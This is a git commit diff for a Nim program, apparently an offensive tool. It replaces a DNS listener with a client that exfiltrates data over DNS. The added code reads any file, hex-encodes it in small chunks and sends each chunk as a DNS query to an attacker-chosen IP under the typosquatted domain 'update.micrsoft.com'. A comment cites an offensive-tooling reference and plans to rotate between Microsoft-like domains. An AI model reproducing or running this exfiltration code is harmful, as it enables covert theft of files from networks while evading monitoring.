42b2c1f3c516ed1bd3a35e4c3af311dc4a9586db
Yuri M <yurimaia@protonmail.ch>
2022-11-23 20:44:29 -0300

    Update dnxsvr.nim

--- dnxsvr.nim
+++ dnxsvr.nim
@@ -1,26 +1,55 @@
-import net, strutils, asyncnet, asyncdispatch
+import os, ndns, strutils
 
-let withSize = 256
-var socket = newAsyncSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
-socket.bindAddr(port = Port 53)
+#[
+REF https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/dns_exfiltrate.nim
 
-echo "[+] Listening..."
+TODO: 
+    confirmar envio
+    rotacionar dominios
 
-var query: string
-while true:
-    let 
-        req = waitfor socket.recvFrom(withSize)
-        data = $req.data
-        x = parseHexStr(data.toHex[24 .. ^1])[1 .. ^1]
+domains = [".msn.windows.com", ".update.microsoft.com", ".client.wns.windows.com"]
+]#
 
-    if x.contains("quit"):
-        break
-    elif x.contains("micrsoft"):
-        query.add(x[0 .. ^26])
+if paramCount() < 3:
+    echo "[!] Use: dnsx.exe <IP> <File> <Time between requests in ms>"
+    echo "[!] e.g: dnsx.exe 127.0.0.1 arquivo.pdf 1000"
+    quit()
 
-try:
-    let file = parseHexStr(query)
-    writeFile("new.file", $file)
-    echo "[+] Received: new.file (Sorry, rename it!)"
-except CatchableError as e:
-    echo "[!] Error: ", e.msg
+proc dnsExfiltrate(ns: string, target: string, slp: int): void =
+    
+    let
+        content = readFile(target)
+        hex = content.toHex
+        header = initHeader(randId(), rd = true)
+        client = initDnsClient(ns)
+        chuckSize = 20 # max 62
+    
+    var stringindex: int
+
+    echo "[+] Sending ", paramStr(2)
+
+    try:
+        while stringindex <= hex.len-1:
+            let 
+                query =  hex[stringindex .. (if stringindex + chuckSize - 1 > hex.len - 1: hex.len - 1 else: stringindex + chuckSize - 1)]
+                dnsquery = query & ".update.micrsoft.com"
+                question = initQuestion(dnsquery, QType.A, QClass.IN)
+                msg = initMessage(header, @[question])
+            
+            discard(dnsAsyncQuery(client, msg))
+
+            stringindex += chuckSize
+            sleep(slp)
+
+        let 
+            question = initQuestion("quit", QType.A, QClass.IN)
+            msg = initMessage(header, @[question])
+        
+        discard(dnsAsyncQuery(client, msg))
+        echo "[+] Done!"
+    
+    except CatchableError as e:
+        echo "[!] Error: ", e.msg
+
+when isMainModule:
+    dnsExfiltrate(paramStr(1), paramStr(2), parseInt(paramStr(3)))
